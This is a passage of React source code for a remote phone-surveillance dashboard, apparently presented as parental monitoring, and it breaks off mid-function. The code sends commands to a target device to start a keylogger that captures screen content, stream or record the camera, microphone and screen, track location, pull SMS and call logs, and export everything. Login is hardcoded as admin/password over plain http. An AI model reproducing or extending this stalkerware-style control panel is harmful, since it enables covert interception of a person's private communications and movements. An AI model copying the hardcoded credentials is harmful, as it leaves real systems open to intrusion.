import React, { useState, useEffect, useRef, useCallback, useMemo } from 'react';
import axios from 'axios';
import { Chart as ChartJS, ArcElement, Tooltip, Legend } from 'chart.js';
import { Pie } from 'react-chartjs-2';
import L from 'leaflet';
import { MapContainer, TileLayer, Marker, Polyline, Popup } from 'react-leaflet';
import 'leaflet/dist/leaflet.css';
import './App.css';

import markerIcon from 'leaflet/dist/images/marker-icon.png';
import markerIcon2x from 'leaflet/dist/images/marker-icon-2x.png';
import markerShadow from 'leaflet/dist/images/marker-shadow.png';

import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import { faVideo, faMicrophone, faFileImage, faMapMarkedAlt, faSms, faPhone, faBell, faMobileAlt, faPowerOff, faLock, faChevronLeft, faChevronRight, faImage, faKey, faUserSecret, faKeyboard, faDesktop } from '@fortawesome/free-solid-svg-icons';

// Import app icons
import whatsappIcon from './icons/whatsapp.png';
import tiktokIcon from './icons/tiktok.png';
import instagramIcon from './icons/instagram.png';
import defaultAppIcon from './icons/default.png';

ChartJS.register(ArcElement, Tooltip, Legend);

// New AppIcon component
const AppIcon = ({ packageName, selectedDevice, className }) => {
    const [src, setSrc] = useState(defaultAppIcon);
    const retryCountRef = useRef(0);
    const timeoutRef = useRef(null);
    const MAX_RETRIES = 3;
    const RETRY_DELAY = 2000; // 2 seconds

    const serverIconUrl = useMemo(() => {
        if (packageName && selectedDevice) {
            return `${API_BASE_URL}/storage/${selectedDevice}/icons/${packageName}.png`;
        }
        return null;
    }, [packageName, selectedDevice]);

    useEffect(() => {
        // Reset retry logic when the icon URL changes
        retryCountRef.current = 0;
        if (timeoutRef.current) {
            clearTimeout(timeoutRef.current);
        }

        if (serverIconUrl) {
            setSrc(serverIconUrl);
        } else {
            setSrc(defaultAppIcon);
        }

        // Cleanup timeout on unmount
        return () => {
            if (timeoutRef.current) {
                clearTimeout(timeoutRef.current);
            }
        };
    }, [serverIconUrl]);

    const handleError = useCallback(() => {
        // If we failed to load even the default icon, do nothing to prevent loops.
        if (src === defaultAppIcon) return;

        if (serverIconUrl && retryCountRef.current < MAX_RETRIES) {
            retryCountRef.current += 1;
            timeoutRef.current = setTimeout(() => {
                // Add a cache-busting parameter to force a reload
                setSrc(`${serverIconUrl}?retry=${retryCountRef.current}`);
            }, RETRY_DELAY * retryCountRef.current); // Exponential backoff
        } else {
            // If retries are exhausted, fall back to the default icon
            setSrc(defaultAppIcon);
        }
    }, [serverIconUrl, src]);

    return <img src={src} alt={packageName || 'app icon'} onError={handleError} className={className} />;
};

const API_BASE_URL = `http://${window.location.hostname}:8080`;

const getFontAwesomeIcon = (type) => {
    switch (type) {
        case 'lock': return faLock;
        case 'power': return faPowerOff;
        case 'call': return faPhone;
        case 'sms': return faSms;
        case 'location': return faMapMarkedAlt;
        case 'keylog': return faKeyboard;
        case 'screen_record': return faDesktop;
        case 'video': return faVideo;
        case 'audio': return faMicrophone;
        default: return faUserSecret;
    }
};

const DefaultIcon = L.icon({
  iconUrl: markerIcon,
  iconRetinaUrl: markerIcon2x,
  shadowUrl: markerShadow,
  iconSize: [25, 41],
  iconAnchor: [12, 41],
  popupAnchor: [1, -34],
  shadowSize: [41, 41],
});

L.Marker.prototype.options.icon = DefaultIcon;

function App() {
  const [devices, setDevices] = useState([]);
  const [selectedDevice, setSelectedDevice] = useState('');
  const [activities, setActivities] = useState([]);
  const [files, setFiles] = useState([]);
  const [allKeylogs, setAllKeylogs] = useState([]);
  const [locations, setLocations] = useState([]);
  const [smsLogs, setSmsLogs] = useState([]);
  const [callLogs, setCallLogs] = useState([]);
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [isLoggedIn, setIsLoggedIn] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [toastMessage, setToastMessage] = useState('');
  const [currentPage, setCurrentPage] = useState({
    liveKeylogs: 0,
    dailyOfflineKeylogs: 0,
    locations: 0,
    sms: 0,
    calls: 0,
  });
  const [expandedRows, setExpandedRows] = useState({});
  const [expandedSessions, setExpandedSessions] = useState({});
  const [sortConfig, setSortConfig] = useState({ key: 'timestamp', direction: 'desc' });
  const [tableView, setTableView] = useState('detailed');
  const [videoStreamStatus, setVideoStreamStatus] = useState('Disconnected');
  const [audioStreamStatus, setAudioStreamStatus] = useState('Disconnected');
  const [keyloggerStatus, setKeyloggerStatus] = useState('Disconnected');
  const [screenRecordStatus, setScreenRecordStatus] = useState('Disconnected');
  const [selectedFiles, setSelectedFiles] = useState([]);
  const [modalFile, setModalFile] = useState(null);
  const [fps, setFps] = useState(2);
  const [resolution, setResolution] = useState('640x480');
  const [cameraType, setCameraType] = useState('back');
  const [audioMicType, setAudioMicType] = useState('default');
  const [sampleRate, setSampleRate] = useState(44100);
  const [screenRecordDuration, setScreenRecordDuration] = useState(60);
  const [screenRecordFps, setScreenRecordFps] = useState(2);
  const [activeSection, setActiveSection] = useState('overview');
  const [deviceConnected, setDeviceConnected] = useState(false);
  const [currentTime, setCurrentTime] = useState(new Date());
  const [currentLocation, setCurrentLocation] = useState(null);
  const [smsMessages, setSmsMessages] = useState([]);
  const [locationHistory, setLocationHistory] = useState([]);
  const [recentActivity, setRecentActivity] = useState([]);
  const [activeCommTab, setActiveCommTab] = useState('sms');
  const [notifications, setNotifications] = useState([]);
  const [isLocationFetching, setIsLocationFetching] = useState(false);
  const [deviceInfo, setDeviceInfo] = useState(null);
  const [selectedDate, setSelectedDate] = useState(new Date());
  const itemsPerPage = 200;
  const videoFrameRef = useRef(null);
  const wsRef = useRef(null);
  const audioContextRef = useRef(null);
  const audioQueueRef = useRef([]);
  const isPlayingRef = useRef(false);
  const analyserRef = useRef(null);
  const canvasRef = useRef(null);
  const lastVideoTimestampRef = useRef(0);
  const lastVideoSequenceRef = useRef(0);
  const syncIssueCountRef = useRef(0);
  const geocodeCache = useRef(new Map());
  const [activeTab, setActiveTab] = useState('activities'); // 'activities' or 'notifications'
  const selectedDateRef = useRef(selectedDate);
  const videoRenderLoopId = useRef(null);
  const isVideoPlaying = useRef(false);

  useEffect(() => {
    selectedDateRef.current = selectedDate;
  }, [selectedDate]);

  const renderTimeline = (items) => {
    if (!items || items.length === 0) {
        return <div className="no-data-message">No data to display for the selected date.</div>;
    }

    return (
        <div className="timeline-view">
            {items.map(item => (
                <div key={item.id} className="timeline-item">
                    <span className="timeline-time">{new Date(item.timestamp).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', hour12: true })}</span>
                    <div className="timeline-icon-container">
                         <div className="timeline-icon">
                            {['notification', 'app_usage'].includes(item.type)
                                ? <AppIcon packageName={item.packageName} selectedDevice={selectedDevice} className="timeline-icon-img" />
                                : <FontAwesomeIcon icon={getFontAwesomeIcon(item.icon)} />
                            }
                        </div>
                    </div>
                    <div className="timeline-content">
                       <span className="timeline-title">{item.title}</span>
                       <p className="timeline-description">{item.description}</p>
                    </div>
                </div>
            ))}
        </div>
    );
  };

  const fetchDevices = async () => {
    try {
        const response = await axios.get(`${API_BASE_URL}/api/devices`);
        const deviceData = Array.isArray(response.data) ? response.data : [];
        setDevices(deviceData);
        if (deviceData.length > 0) {
            const currentDevice = deviceData[0].deviceId;
            setSelectedDevice(currentDevice);
        }
    } catch (error) {
        console.error('Error fetching devices:', error);
        showToast('Failed to fetch connected devices');
    }
  };

  const resetStateForNewDevice = () => {
    setFiles([]);
    setAllKeylogs([]);
    setLocations([]);
    setSmsLogs([]);
    setCallLogs([]);
    setActivities([]);
    setCurrentLocation(null);
    setLocationHistory([]);
    setRecentActivity([]);
    setDeviceInfo(null);
    setDeviceConnected(false);
    if (videoFrameRef.current) videoFrameRef.current.src = '';
    audioQueueRef.current = [];
    isPlayingRef.current = false;
    setScreenRecordStatus('Disconnected');
    // Don't reset notifications, toast, or login state
  };

  const handleDeviceChange = (deviceId) => {
    if (selectedDevice === deviceId) return;
    
    console.log(`Switching to device: ${deviceId}`);
    resetStateForNewDevice();
    setSelectedDevice(deviceId);
    // Data for the new device will be fetched by the useEffect below
  };

  useEffect(() => {
    if (isLoggedIn) {
        fetchDevices();
    } else {
        setDevices([]);
        setSelectedDevice('');
        resetStateForNewDevice();
    }
  }, [isLoggedIn]);

  useEffect(() => {
    if (isLoggedIn && selectedDevice) {
      console.log(`Fetching data for device: ${selectedDevice}`);
      fetchStorage();
      fetchInitialLogs();
      fetchActivities();
      setupWebSocket();
      audioContextRef.current = new (window.AudioContext || window.webkitAudioContext)({
        sampleRate: parseInt(sampleRate),
      });
      analyserRef.current = audioContextRef.current.createAnalyser();
      analyserRef.current.fftSize = 512;
      setupAudioVisualization();
    }

    return () => {
      if (wsRef.current) {
        wsRef.current.close();
      }
      if (audioContextRef.current) {
        audioContextRef.current.close();
        audioContextRef.current = null;
      }
      audioQueueRef.current = [];
      isPlayingRef.current = false;
      syncIssueCountRef.current = 0;
      isVideoPlaying.current = false;
      if (videoRenderLoopId.current) {
          clearTimeout(videoRenderLoopId.current);
      }
    };
  }, [isLoggedIn, selectedDevice]);

  useEffect(() => {
    if (isLoggedIn && selectedDevice && audioContextRef.current) {
      audioContextRef.current.close();
      audioContextRef.current = new (window.AudioContext || window.webkitAudioContext)({
        sampleRate: parseInt(sampleRate),
      });
      analyserRef.current = audioContextRef.current.createAnalyser();
      analyserRef.current.fftSize = 512;
      setupAudioVisualization();
    }
  }, [sampleRate, isLoggedIn, selectedDevice]);

  useEffect(() => {
    const timer = setInterval(() => {
      setCurrentTime(new Date());
    }, 1000);
    return () => clearInterval(timer);
  }, []);

  const geocodeLocation = async (latitude, longitude) => {
    const cacheKey = `${latitude.toFixed(6)},${longitude.toFixed(6)}`;
    if (geocodeCache.current.get(cacheKey)) {
      return geocodeCache.current.get(cacheKey);
    }
    try {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      const response = await axios.get('https://nominatim.openstreetmap.org/reverse', {
        params: {
          format: 'json',
          lat: latitude,
          lon: longitude,
          zoom: 18,
          addressdetails: 1,
        },
        headers: {
          'User-Agent': 'MonitorProWebApp/1.0 (parent-monitor@example.com)',
        },
      });
      const address = response.data.display_name || 'Unknown';
      geocodeCache.current.set(cacheKey, address);
      return address;
    } catch (error) {
      console.error('Geocoding error:', error);
      showToast('Failed to fetch address');
      return 'Unknown';
    }
  };

  const setupAudioVisualization = () => {
    const canvas = canvasRef.current;
    if (!canvas) return;
    const canvasCtx = canvas.getContext('2d');
    const analyser = analyserRef.current;
    let animationFrameId;

    const draw = () => {
      if (audioStreamStatus !== 'Streaming') {
        canvasCtx.clearRect(0, 0, canvas.width, canvas.height);
        animationFrameId = requestAnimationFrame(draw);
        return;
      }
      animationFrameId = requestAnimationFrame(draw);
      const bufferLength = analyser.frequencyBinCount;
      const dataArray = new Uint8Array(bufferLength);
      analyser.getByteTimeDomainData(dataArray);

      canvasCtx.fillStyle = '#f0f0f0';
      canvasCtx.fillRect(0, 0, canvas.width, canvas.height);
      canvasCtx.lineWidth = 2;
      canvasCtx.strokeStyle = '#007bff';
      canvasCtx.beginPath();

      const sliceWidth = (canvas.width * 1.0) / bufferLength;
      let x = 0;
      for (let i = 0; i < bufferLength; i++) {
        const v = dataArray[i] / 128.0;
        const y = (v * canvas.height) / 2;
        if (i === 0) {
          canvasCtx.moveTo(x, y);
        } else {
          canvasCtx.lineTo(x, y);
        }
        x += sliceWidth;
      }
      canvasCtx.lineTo(canvas.width, canvas.height / 2);
      canvasCtx.stroke();
    };

    draw();
    return () => cancelAnimationFrame(animationFrameId);
  };

  const fetchStorage = useCallback(async () => {
    if (!selectedDevice) return;
    setIsLoading(true);
    try {
      const response = await axios.get(`${API_BASE_URL}/api/storage/${selectedDevice}`);
      const fileData = Array.isArray(response.data) ? response.data : [];
      const newFiles = fileData.map((file) => ({
        ...file,
        timestamp: parseInt(
          file.name.match(/audio_(\d+)\.opus|video_(\d+)\.mp4/)?.[1] ||
            file.name.match(/audio_(\d+)\.opus|video_(\d+)\.mp4/)?.[2] ||
            Date.now()
        ),
      }));
      setFiles(newFiles);
      const storageUsedMB = calculateStorageUsed(newFiles);
      if (storageUsedMB >= 8) {
        showToast('Warning: Storage usage is above 80% of 10 MB limit');
        addNotification('Storage', 'Storage usage is high, consider deleting files');
      }
      if (files.length > 0 && newFiles.length < files.length) {
        showToast('Some files may have been automatically cleaned up due to storage limits');
        addNotification('Storage', 'Files cleaned up by device due to storage limits');
      }
    } catch (error) {
      console.error('Error fetching storage:', error);
      showToast('Failed to fetch storage data');
    } finally {
      setIsLoading(false);
    }
  }, [selectedDevice]);

  const fetchInitialLogs = useCallback(async () => {
    if (!selectedDevice) return;
    setIsLoading(true);
    try {
      const keylogResponse = await axios.get(`${API_BASE_URL}/api/logs/${selectedDevice}/keylog`);
      const keylogsData = Array.isArray(keylogResponse.data) ? keylogResponse.data : [];
      
      const normalizedKeylogs = keylogsData.map(log => {
        const payload = log.data || {};
        return {
          id: `${payload.timestamp}_${Math.random()}`,
          appName: payload.app || 'Unknown App',
          data: payload.keys || '',
          eventType: payload.event_type || 'keylog',
          timestamp: payload.timestamp,
          sessionId: payload.session_id,
          screenContent: payload.screen_content,
          eventText: payload.event_text
        };
      }).sort((a, b) => b.timestamp - a.timestamp);

      setAllKeylogs(normalizedKeylogs);

      const locationResponse = await axios.get(`${API_BASE_URL}/api/logs/${selectedDevice}/location`);
      const smsResponse = await axios.get(`${API_BASE_URL}/api/logs/${selectedDevice}/sms`);
      const callLogResponse = await axios.get(`${API_BASE_URL}/api/logs/${selectedDevice}/call_log`);

      const locationData = Array.isArray(locationResponse.data) ? locationResponse.data : [];
      const processedLocations = await Promise.all(
        locationData.map(async (entry) => {
          let lat, lng, address;
          if (typeof entry.data === 'string') {
            const match = entry.data.match(/Lat: ([-\d.]+), Lng: ([-\d.]+)/);
            if (match) {
                lat = parseFloat(match[1]);
                lng = parseFloat(match[2]);
                address = await geocodeLocation(lat, lng);
            } else {
                lat = 0;
                lng = 0;
                address = 'Unknown location format';
            }
          } else {
            lat = entry.data.latitude || 0;
            lng = entry.data.longitude || 0;
            address = entry.data.address || (await geocodeLocation(lat, lng));
          }
          return {
            ...entry,
            id: `${entry.timestamp || Date.now()}_${Math.random()}`,
            lat,
            lng,
            address,
          };
        })
      );
      setLocations(processedLocations);

      const normalizedSmsLogs = Array.isArray(smsResponse.data)
        ? smsResponse.data.map((entry) => {
            if (typeof entry.data === 'object' && entry.data !== null) {
                return {
                    number: entry.data.address || 'Unknown',
                    type: entry.data.type || 'received',
                    content: entry.data.body || '',
                    timestamp: entry.timestamp ? new Date(entry.timestamp).toLocaleString() : new Date().toLocaleString(),
                    id: `${entry.timestamp || Date.now()}_${Math.random()}`,
                };
            } else if (typeof entry.data === 'string') {
                const smsMatch = entry.data.match(/From: ([\d\w\s+()-]+), Message: (.*)/s);
                return {
                    number: smsMatch ? smsMatch[1].trim() : 'Unknown',
                    type: 'received',
                    content: smsMatch ? smsMatch[2].trim() : entry.data,
                    timestamp: entry.timestamp ? new Date(entry.timestamp).toLocaleString() : new Date().toLocaleString(),
                    id: `${entry.timestamp || Date.now()}_${Math.random()}`,
                };
            }
            return null;
        }).filter(Boolean)
      : [];
      setSmsLogs(normalizedSmsLogs);
      setSmsMessages(normalizedSmsLogs);

      const normalizedCallLogs = Array.isArray(callLogResponse.data)
        ? callLogResponse.data.map((entry) => {
            const callDetails = entry.data || {};
            if (typeof callDetails === 'object') {
                return {
                  number: callDetails.number || 'Unknown',
                  type: callDetails.type ? callDetails.type.toLowerCase() : 'unknown',
                  content: `Duration: ${callDetails.duration || 0}s`,
                  timestamp: entry.timestamp ? new Date(entry.timestamp).toLocaleString() : new Date().toLocaleString(),
                  id: `${entry.timestamp || Date.now()}_${Math.random()}`,
                  name: callDetails.name,
                  duration: callDetails.duration,
                  date: callDetails.date || entry.timestamp,
                };
            } else if (typeof callDetails === 'string') {
                 const numberMatch = callDetails.match(/Number: ([\d\w\s+()-]+)/);
                 const durationMatch = callDetails.match(/Duration: (\d+)/);
                 const typeMatch = callDetails.match(/Type: (\w+)/);
                 return {
                    number: numberMatch ? numberMatch[1].trim() : 'Unknown',
                    type: typeMatch ? typeMatch[1].toLowerCase() : 'unknown',
                    content: durationMatch ? `Duration: ${durationMatch[1]}s` : callDetails,
                    timestamp: entry.timestamp ? new Date(entry.timestamp).toLocaleString() : new Date().toLocaleString(),
                    id: `${entry.timestamp || Date.now()}_${Math.random()}`,
                 };
            }
            return null;
          }).filter(Boolean)
        : [];
      setCallLogs(normalizedCallLogs);

      setLocationHistory(
        processedLocations.map((loc) => ({
          lat: loc.lat,
          lng: loc.lng,
          address: loc.address,
          timestamp: loc.timestamp,
        }))
      );
    } catch (error) {
      console.error('Error fetching initial logs:', error);
      showToast('Failed to fetch initial logs');
    } finally {
      setIsLoading(false);
    }
  }, [selectedDevice]);

  const fetchActivities = useCallback(async () => {
    if (!selectedDevice) return;
    try {
      const response = await axios.get(`${API_BASE_URL}/api/activities/${selectedDevice}`, { params: { date: selectedDate.toISOString().split('T')[0] } });
      const activities = Array.isArray(response.data) ? response.data : [];
      const filteredActivities = activities.filter(
        (activity) => activity.type !== 'sms' && activity.type !== 'call_log'
      );
      setActivities(filteredActivities);
    } catch (error) {
      console.error('Error fetching activities:', error);
      setActivities([]);
    }
  }, [selectedDevice, selectedDate]);

  const fetchNotifications = useCallback(async () => {
    if (!selectedDevice) return;
    try {
      const response = await axios.get(`${API_BASE_URL}/api/notifications/${selectedDevice}`, { params: { date: selectedDate.toISOString().split('T')[0] } });
      const notifications = Array.isArray(response.data) ? response.data : [];
      setNotifications(notifications);
    } catch (error) {
      console.error('Error fetching notifications:', error);
      setNotifications([]);
    }
  }, [selectedDevice, selectedDate]);

  useEffect(() => {
    if (isLoggedIn && selectedDevice) {
        if (activeTab === 'activities') {
            fetchActivities();
        } else {
            fetchNotifications();
        }
    }
  }, [isLoggedIn, selectedDevice, activeTab, selectedDate, fetchActivities, fetchNotifications]);

  const groupLogsByDate = (data) => {
    const grouped = {};
    data.forEach((log) => {
      const date = new Date(log.timestamp).toDateString();
      if (!grouped[date]) {
        grouped[date] = { date, logs: [], totalKeystrokes: 0 };
      }
      grouped[date].logs.push(log);
      grouped[date].totalKeystrokes += log.data ? log.data.length : 0;
    });
    return Object.values(grouped);
  };

  const login = () => {
    if (username === 'admin' && password === 'password') {
      setIsLoggedIn(true);
      showToast('Login successful');
      addNotification('System', 'User logged in');
    } else {
      showToast('Invalid credentials');
    }
  };

  const logout = () => {
    setIsLoggedIn(false);
    setActiveSection('overview');
    setAllKeylogs([]);
    setDeviceConnected(false);
    setVideoStreamStatus('Disconnected');
    setAudioStreamStatus('Disconnected');
    setKeyloggerStatus('Disconnected');
    addNotification('System', 'User logged out');
  };

  const sendCommand = async (command) => {
    if (!selectedDevice) {
        showToast('No device selected');
        return;
    }
    try {
      let payload = { command };
      if (command === 'start_camera' || command === 'record_camera') {
        const validFps = Math.max(1, Math.min(parseInt(fps), 30));
        const validResolutions = ['320x240', '640x480', '1280x720'];
        if (!validResolutions.includes(resolution)) {
          showToast('Invalid resolution');
          return;
        }
        payload = {
          command,
          fps: validFps,
          resolution,
          cameraType: cameraType === 'front' ? 'front' : 'back',
        };
        if (command === 'start_camera') {
          setVideoStreamStatus('Connecting');
          addNotification('Video', 'Starting video stream');
        } else if (command === 'record_camera'){
          setVideoStreamStatus('Recording');
          addNotification('Video', 'Recording video');
        }
      } else if (command === 'start_audio' || command === 'record_audio') {
        const validMicTypes = ['default', 'front', 'back', 'voice'];
        const validSampleRates = [8000, 11025, 16000, 22050, 44100, 48000];
        const sampleRateNum = parseInt(sampleRate);
        if (isNaN(sampleRateNum) || !validSampleRates.includes(sampleRateNum)) {
          showToast('Invalid sample rate. Choose from: 8000, 11025, 16000, 22050, 44100, 48000 Hz');
          return;
        }
        if (!validMicTypes.includes(audioMicType)) {
          showToast('Invalid microphone type');
          return;
        }
        payload = {
          command,
          micType: audioMicType,
          sampleRate: sampleRateNum,
        };
        if (command === 'start_audio') {
          setAudioStreamStatus('Connecting');
          addNotification('Audio', 'Starting audio stream');
          syncIssueCountRef.current = 0;
        } else if (command === 'record_audio') {
          setAudioStreamStatus('Recording');
          addNotification('Audio', 'Recording audio');
        }
      } else if (command === 'start_keylogger') {
        setKeyloggerStatus('Connecting');
        addNotification('Keylogger', 'Starting keylogger');
      } else if (command === 'reconnect_child') {
        showToast('Attempting to reconnect device...');
        addNotification('System', 'Attempting device reconnection');
      } else if (command === 'stop_camera') {
        setVideoStreamStatus('Disconnected');
        addNotification('Video', 'Stopped video stream');
        if (videoFrameRef.current) videoFrameRef.current.src = '';
      } else if (command === 'stop_record_camera') {
        setVideoStreamStatus('Disconnected');
        addNotification('Video', 'Stopped video recording');
        if (videoFrameRef.current) videoFrameRef.current.src = '';
      } else if (command === 'stop_audio') {
        setAudioStreamStatus('Disconnected');
        audioQueueRef.current = [];
        isPlayingRef.current = false;
        addNotification('Audio', 'Stopped audio stream');
      } else if (command === 'stop_record_audio') {
        setAudioStreamStatus('Disconnected');
        addNotification('Audio', 'Stopped audio recording');
      } else if (command === 'start_screen_recording') {
        const duration = parseInt(screenRecordDuration, 10);
        if (isNaN(duration) || duration <= 0) {
            showToast('Please enter a valid duration in seconds.');
            return;
        }
        const fps = parseInt(screenRecordFps, 10);
        payload = { command, duration, fps };
        setScreenRecordStatus('Recording');
        addNotification('Screen Record', `Starting recording for ${duration} seconds at ${fps} FPS.`);
      } else if (command === 'stop_screen_recording') {
        setScreenRecordStatus('Disconnected');
        addNotification('Screen Record', 'Stopping screen recording.');
      } else if (command === 'start_location') {
        setIsLocationFetching(true);
        showToast('Requesting location update...');
        addNotification('Location', 'Requesting location update');
      } else if (command === 'read_sms') {
        addNotification('Communication', 'Fetching SMS messages');
      } else if (command === 'read_call_log') {
        addNotification('Communication', 'Fetching call logs');
      } else if (command === 'get_device_info') {
        showToast('Fetching device information...');
        addNotification('System', 'Fetching device information');
      } else if (command === 'clear_cache') {
        showToast('Clearing cache...');
        addNotification('System', 'Clearing cache');
      } else if (command === 'clear_data') {
        showToast('Clearing app data...');
        addNotification('System', 'Clearing app data');
      }
      await axios.post(`${API_BASE_URL}/api/command/${selectedDevice}`, payload);
      showToast(`Command sent: ${command}`);
      if (command === 'start_keylogger') setKeyloggerStatus('Active');
      if (command === 'stop_keylogger') {
        setKeyloggerStatus('Disconnected');
        addNotification('Keylogger', 'Stopped keylogger');
      }
    } catch (e) {
      console.error('Error sending command:', e);
      showToast(`Failed to send command: ${e.message}`);
      addNotification('Error', `Command failed: ${command}`);
      if (command === 'start_camera' || command === 'record_camera') setVideoStreamStatus('Failed');
      if (command === 'start_audio' || command === 'record_audio') setAudioStreamStatus('Failed');
      if (command === 'start_keylogger') setKeyloggerStatus('Failed');
      if (command === 'start_screen_recording') setScreenRecordStatus('Failed');
      if (command === 'start_location') {
        showToast('Failed to request location');
        setIsLocationFetching(false);
      }
    } finally {
      if (command === 'start_location') {
        setTimeout(() => setIsLocationFetching(false), 5000);
      }
    }
  };

  const startVideoPlayback = () => {
    // Video frames are now handled directly as binary blobs in WebSocket onmessage
    // This function is no longer needed for the current implementation
    console.log('Video playback is handled directly via binary WebSocket messages');
  };

  const playAudioQueue = () => {
    if (!audioContextRef.current || audioQueueRef.current.length === 0 || isPlayingRef.current) return;
    const { samples, timestamp, sequence } = audioQueueRef.current.shift();
    
    // Simplified sync check - removed complex video sync logic
    try {
      if (samples.length !== parseInt(sampleRate) / 100) {
        console.warn('Unexpected audio frame size, expected PCM 16-bit mono');
      }
      const audioBuffer = audioContextRef.current.createBuffer(
        1,
        samples.length,
        audioContextRef.current.sampleRate
      );
      audioBuffer.copyToChannel(samples, 0);
      const source = audioContextRef.current.createBufferSource();
      source.buffer = audioBuffer;
      source.connect(analyserRef.current);
      analyserRef.current.connect(audioContextRef.current.destination);
      source.onended = () => {
        isPlayingRef.current = false;
        playAudioQueue();
      };
      source.start();
      isPlayingRef.current = true;
    } catch (e) {
      console.error('Error playing audio frame:', e);
      addNotification('Error', 'Failed to play audio frame');
      isPlayingRef.current = false;
      playAudioQueue();
    }
  };

  const deleteFile = async (fileName) => {
    if (!selectedDevice) return;
    try {
      await axios.delete(`${API_BASE_URL}/api/storage/${selectedDevice}/delete`, {
        data: { filename: fileName },
      });
      showToast('File deleted successfully');
      addNotification('Storage', `File deleted: ${fileName}`);
      fetchStorage();
    } catch (error) {
      console.error('Error deleting file:', error);
      showToast('Failed to delete file');
      addNotification('Error', `Failed to delete file: ${fileName}`);
    }
  };

  const downloadFile = async (fileName) => {
    if (!selectedDevice) return;
    try {
      const link = document.createElement('a');
      link.href = `${API_BASE_URL}/storage/${selectedDevice}/${fileName}`;
      link.setAttribute('download', fileName);
      document.body.appendChild(link);
      link.click();
      link.remove();
      showToast('Download started');
      addNotification('Storage', `File downloaded: ${fileName}`);
    } catch (error) {
      console.error('Error downloading file:', error);
      showToast('Failed to download file');
      addNotification('Error', `Failed to download file: ${fileName}`);
    }
  };

  const deleteSelectedFiles = async () => {
    if (!selectedDevice) return;
    if (selectedFiles.length === 0) {
      showToast('No files selected');
      return;
    }
    try {
      await Promise.all(
        selectedFiles.map((filename) =>
          axios.delete(`${API_BASE_URL}/api/storage/${selectedDevice}/delete`, { data: { filename } })
        )
      );
      showToast(`${selectedFiles.length} files deleted successfully`);
      addNotification('Storage', `Deleted ${selectedFiles.length} files`);
      setSelectedFiles([]);
      fetchStorage();
    } catch (error) {
      console.error('Error deleting files:', error);
      showToast('Failed to delete selected files');
      addNotification('Error', 'Failed to delete selected files');
    }
  };

  const exportData = async () => {
    if (!selectedDevice) {
      showToast('No device selected');
      return;
    }
    
    try {
      showToast('Exporting data...');
      addNotification('System', 'Started data export');
      
      // Create download link for JSON export
      const link = document.createElement('a');
      link.href = `${API_BASE_URL}/api/export/${selectedDevice}?format=json`;
      link.setAttribute('download', `device_${selectedDevice}_export.json`);
      document.body.appendChild(link);
      link.click();
      link.remove();
      
      showToast('Data export completed');
      addNotification('System', 'Data export completed');
    } catch (error) {
      console.error('Error exporting data:', error);
      showToast('Failed to export data');
      addNotification('Error', 'Failed to export data');
    }
  };

  const addRecentActivity = (type, message) => {
    const activity = {
      type,
      message,
      timestamp: new Date().toLocaleTimeString(),
    };
    setRecentActivity((prev) => [activity, ...prev].slice(0, 5));
    addNotification(type, message);
  };

  const addNotification = (type, message) => {
    const notification = {
      id: `${Date.now()}_${Math.random()}`,
      type,
      message,
      timestamp: new Date().toLocaleString(),
      read: false,
    };
    setNotifications((prev) => [notification, ...prev].slice(0, 50));
  };

  const dismissNotification = (id) => {
    setNotifications((prev) => prev.filter((notification) => notification.id !== id));
  };

  const setupWebSocket = useCallback(() => {
    if (!selectedDevice) return;

    const connect = () => {
        const wsProtocol = API_BASE_URL.startsWith('https://') ? 'wss:' : 'ws:';
        const host = API_BASE_URL.replace(/^https?:\/\//, '');
        const wsUrl = `${wsProtocol}//${host}`;
        wsRef.current = new WebSocket(wsUrl);
        wsRef.current.binaryType = 'blob'; // Handle binary data
        
        wsRef.current.onopen = () => {
          wsRef.current.send(JSON.stringify({ clientType: 'parent', deviceId: selectedDevice }));
          console.log('WebSocket connected');
          addNotification('System', 'WebSocket connection established');
        };

        wsRef.current.onmessage = async (event) => {
            try {
                 // Handle binary camera frames
                if (event.data instanceof Blob) {
                    if (videoFrameRef.current) {
                        videoFrameRef.current.src = URL.createObjectURL(event.data);
                        setVideoStreamStatus('Streaming');
                    }
                    return;
                }

                if (typeof event.data === 'string') {
                    const data = JSON.parse(event.data);
                    console.log('Received WebSocket message:', data);

                    // Handle live timeline updates for activities and notifications
                    if (data.type === 'notification' || data.type === 'activity') {
                        const timestamp = data.type === 'activity' ? data.data.timestamp : data.timestamp;

                        if (timestamp) {
                            const messageDateStr = new Date(timestamp).toISOString().split('T')[0];
                            const selectedDateStr = selectedDateRef.current.toISOString().split('T')[0];
    
                            if (messageDateStr === selectedDateStr) {
                                if (data.type === 'notification') {
                                    setNotifications(prev => [data, ...prev].sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp)));
                                } else { // 'activity'
                                    const activity = data.data;
                                    if (activity.type !== 'sms' && activity.type !== 'call_log') {
                                        setActivities(prev => [activity, ...prev].sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp)));
                                    }
                                }
                            }
                        }
                    }

                    if (data.error) {
                      showToast(`Error: ${data.error}`);
                      addNotification('Error', `WebSocket error: ${data.error}`);
                      console.error('WebSocket error:', data.error);
                      return;
                    }

                    if (data.deviceId && data.deviceId !== selectedDevice) {
                      console.log(`Ignoring message from non-selected device: ${data.deviceId}`);
                      return;
                    }

                    if (data.type === 'child_connected') {
                      showToast(`Child device connected: ${data.deviceId}`);
                      addNotification('System', `Child device connected: ${data.deviceId}`);
                      setDeviceConnected(true);
                      fetchDevices();
                      setVideoStreamStatus('Disconnected');
                      setAudioStreamStatus('Disconnected');
                      setKeyloggerStatus('Disconnected');
                      setScreenRecordStatus('Disconnected');
                      sendCommand('get_device_info');
                    } else if (data.type === 'child_disconnected') {
                      showToast(`Child device disconnected: ${data.deviceId}`);
                      addNotification('System', `Child device disconnected: ${data.deviceId}`);
                      setDeviceConnected(false);
                      setVideoStreamStatus('Disconnected');
                      setAudioStreamStatus('Disconnected');
                      setKeyloggerStatus('Disconnected');
                      setScreenRecordStatus('Disconnected');
                      if (videoFrameRef.current) videoFrameRef.current.src = '';
                      audioQueueRef.current = [];
                      isPlayingRef.current = false;
                      syncIssueCountRef.current = 0;
                      isVideoPlaying.current = false;
                    } else if (data.type === 'device_renamed') {
                        setDevices(prevDevices => prevDevices.map(d => 
                            d.deviceId === data.deviceId ? { ...d, deviceName: data.deviceName } : d
                        ));
                    } else if (data.dataType === 'audio_frame') {
